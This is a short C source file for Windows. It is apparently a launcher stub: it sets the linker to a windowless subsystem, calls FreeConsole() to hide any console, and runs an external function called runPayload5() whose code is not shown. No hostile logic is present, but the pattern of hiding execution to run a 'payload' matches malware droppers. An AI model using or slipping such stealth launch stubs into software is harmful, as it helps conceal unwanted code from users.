#include <windows.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

extern void runPayload5();

int main() {
    FreeConsole();
    runPayload5();
    return 0;
}